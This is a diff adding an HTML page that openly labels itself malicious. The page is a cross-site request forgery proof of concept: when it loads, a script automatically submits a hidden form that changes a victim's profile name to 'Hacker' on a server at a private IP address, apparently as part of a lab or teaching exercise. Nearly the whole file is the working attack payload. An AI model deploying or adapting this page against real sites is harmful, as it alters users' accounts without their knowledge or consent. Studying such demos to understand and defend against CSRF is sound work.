@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Web Page</title>
+</head>
+<body>
+    <h1>Malicious Web Page</h1>
+    <p>This is a malicious web page designed to perform a CSRF attack.</p>
+    <p>When you visit this page, it will automatically submit a form to update the victim's profile on server-A.</p>
+
+    <!-- Malicious form that performs a CSRF attack -->
+    <form id="csrfForm" action="http://192.168.201.97:5000/update_profile" method="post">
+        <input type="hidden" name="new_name" value="Hacker">
+    </form>
+
+    <!-- Automatically submit the form when the page loads -->
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
